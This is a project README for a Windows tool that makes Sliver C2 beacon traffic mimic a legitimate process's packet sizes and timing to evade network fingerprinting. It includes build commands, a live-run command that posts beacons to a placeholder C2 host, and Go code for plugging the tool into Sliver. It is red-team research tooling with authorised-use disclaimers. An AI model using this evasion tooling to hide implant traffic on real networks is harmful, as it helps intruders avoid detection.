# Echolalia

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f172a,100:1d4ed8&height=180&section=header&text=Echolalia&fontSize=48&fontColor=ffffff&animation=fadeIn" alt="Echolalia banner" />
</p>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=18&duration=2800&pause=700&color=3B82F6&center=true&vCenter=true&width=900&lines=Windows+C2+traffic+mimicry+for+Sliver;Profiles+real+host+flows;Shapes+packet+size+and+timing;Validates+fit+with+K-S+statistics" alt="Animated project summary" />
</p>

<p align="center">
  <a href="https://go.dev/"><img src="https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go&logoColor=white" alt="Go version" /></a>
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?logo=windows&logoColor=white" alt="Windows platform" />
  <img src="https://img.shields.io/badge/Capture-npcap%20%7C%20etw-1f2937" alt="Capture backends" />
  <img src="https://img.shields.io/badge/Validation-KS%20test-2563eb" alt="K-S validation" />
</p>

Echolalia is a Windows transport layer for [Sliver](https://github.com/BishopFox/sliver).  
It profiles outbound traffic from a legitimate process and shapes C2 beacons to follow the same packet-size and timing profile.

> [!WARNING]
> This tool is for security research and authorised testing only.

## Contents

- [Why Echolalia](#why-echolalia)
- [Quick Start](#quick-start)
- [How It Works](#how-it-works)
- [Build Options](#build-options)
- [Profiler CLI](#profiler-cli)
- [echo-beacon Demo](#echo-beacon-demo)
- [Sliver Integration](#sliver-integration)
- [Testing](#testing)
- [Project Layout](#project-layout)
- [Limitations](#limitations)
- [External Resources](#external-resources)
- [Legal](#legal)

---

## Why Echolalia

Traditional beacon traffic is often easy to fingerprint.  
Echolalia focuses on traffic shape instead of payload semantics:

- learns per-host traffic behaviour
- selects a dominant process as mimic target
- reproduces packet sizes and inter-arrival timing
- validates shaped output against reference distribution

---

## Quick Start

```powershell
# 1) Build (ETW default)
go build ./...

# 2) Profile host traffic
go run ./cmd/profiler/ -duration 60s -output profile.json

# 3) Run demo in dry mode
echo-beacon.exe -profile-secs 20 -dry-run
```

> [!TIP]
> Install [Npcap](https://npcap.com) to unlock packet-level sampling and JA4 extraction.

---

## How It Works

### 1) Profiling

On first run, Echolalia watches outbound TCP traffic for a configurable window (default: 60 seconds).

| Backend | Requirements | Captured data |
| --- | --- | --- |
| `npcap` (preferred) | Npcap driver installed | packet sizes, inter-arrival times, TLS ClientHello (JA4), endpoints |
| `etw` (fallback) | built into Windows | TCP table data via `iphlpapi!GetExtendedTcpTable`, estimated size, timing |

Each observed process is scored by:
- packet-size stability
- traffic volume
- endpoint diversity

The top score becomes the mimic target.

### 2) Packet shaping

`mimicry.Shape` converts raw beacon bytes into timed packet fragments.

- size model  
  - `pcap`: inverse-transform sampling from empirical CDF
  - `etw`: Gaussian sampling (Box-Muller) from profile mean/stddev
- timing model  
  - exponential or normal IAT distribution (AIC-selected)
- TLS model  
  - JA4-derived TLS bounds + ALPN list

Fragments are padded to match sampled wire sizes.

### 3) Statistical check

After shaping, Echolalia runs a two-sample Kolmogorov-Smirnov check against a fresh reference sample:

```text
D = sup|F_shaped(x) - F_reference(x)|
```

| Profile type | Pass target |
| --- | --- |
| `npcap` | `D < 0.05` |
| `etw` | `D < 0.20` |

### 4) Transport loop

`EcholaliaTransport` sends each packet at its scheduled `SendAt` time.

```text
beacon payload
    |
    v
mimicry.Shape() -> []Packet{Data, SendAt}
                      |
                      +-> sleep until SendAt
                      +-> POST packet to C2
```

Reprofiling triggers automatically after:
- three consecutive beacon failures, or
- four hours since last profile

---

## Build Options

### Default build (ETW-only, no CGO)

```powershell
go build ./...
```

### Build with Npcap support

```powershell
go build -tags npcap ./...
```

### Cross-compile from Linux

```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build ./cmd/echo-beacon/
```

---

## Profiler CLI

Generate a standalone traffic profile:

```powershell
go run ./cmd/profiler/ -duration 60s -output profile.json
```

<details>
<summary>Example profile output</summary>

```json
{
  "process_name": "Dropbox.exe",
  "pid": 19548,
  "protocol": "http2",
  "capture_method": "etw",
  "avg_pkt_size": 1400,
  "pkt_size_stddev": 0,
  "avg_iat": 0.312,
  "iat_stddev": 0.091,
  "iat_dist_shape": "exponential",
  "ja4": "t13d1516h2_8daaf6152771_e5627efa2ab1",
  "endpoints": ["162.125.3.6:443"]
}
```

</details>

---

## `echo-beacon` Demo

`echo-beacon` runs profiler -> mimicry -> transport end-to-end.  
It is a research demonstrator, not a production implant.

### Dry run

```powershell
echo-beacon.exe -profile-secs 20 -dry-run
```

### Live run

```powershell
echo-beacon.exe -c2 http://<C2_HOST>:8080 -profile-secs 30 -beacons 5
```

| Flag | Default | Description |
| --- | --- | --- |
| `-c2` | required | C2 URL for beacon POST |
| `-profile-secs` | `30` | initial profiling duration |
| `-payload-kb` | `64` | synthetic payload size |
| `-beacons` | `3` | number of beacon rounds |
| `-dry-run` | `false` | shape only, do not send |

---

## Sliver Integration

Implement `SliverCore`, then replace the standard HTTP transport with `EcholaliaTransport`.

```go
import "github.com/Emul4nt/echolalia/transport"

t, err := transport.New(ctx, sliverCoreImpl, "https://your-c2:443")
if err != nil {
    // fall back to default transport
}

for {
    if err := t.Beacon(ctx); err != nil {
        log.Printf("beacon error: %v", err)
    }
    time.Sleep(beaconInterval)
}
```

```go
type SliverCore interface {
    GetBeaconPayload() ([]byte, error)
    DeliverResponse(data []byte) error
}
```

---

## Testing

Run the integration harness:

```powershell
$env:ECHOLALIA_INTEGRATION = "1"
go test -tags integration -v -timeout 180s ./testharness/
```

The test validates that mimicry output remains within configured K-S thresholds.

---

## Project Layout

```text
echolalia/
├── profiler/
│   ├── backend.go
│   ├── backend_etw.go
│   ├── backend_pcap_shared.go
│   ├── backend_windows.go
│   ├── backend_windows_npcap.go
│   ├── backend_stub.go
│   ├── pid_windows.go
│   ├── profiler.go
│   └── scorer.go
├── mimicry/
│   ├── sampler.go
│   ├── fragmenter.go
│   ├── ja4.go
│   └── mimicry.go
├── transport/
│   └── transport.go
├── testharness/
│   └── ks_test.go
└── cmd/
    ├── profiler/
    └── echo-beacon/
```

---

## Limitations

- ETW mode estimates packet size instead of measuring every packet
- current profiler targets a single process at a time
- transport currently supports HTTP/HTTPS only
- implementation is Windows-only

---

## External Resources

- [Sliver framework](https://github.com/BishopFox/sliver)
- [Npcap](https://npcap.com)
- [JA4 overview](https://blog.foxio.io/ja4%2B-network-fingerprinting)
- [Kolmogorov-Smirnov test (Wikipedia)](https://en.wikipedia.org/wiki/Kolmogorov%E2%80%93Smirnov_test)
- [MITRE ATT&CK - Command and Control](https://attack.mitre.org/tactics/TA0011/)

---

## Legal

For security research and education.  
Use only on systems you own or have explicit written permission to test.  
The authors accept no liability for misuse.
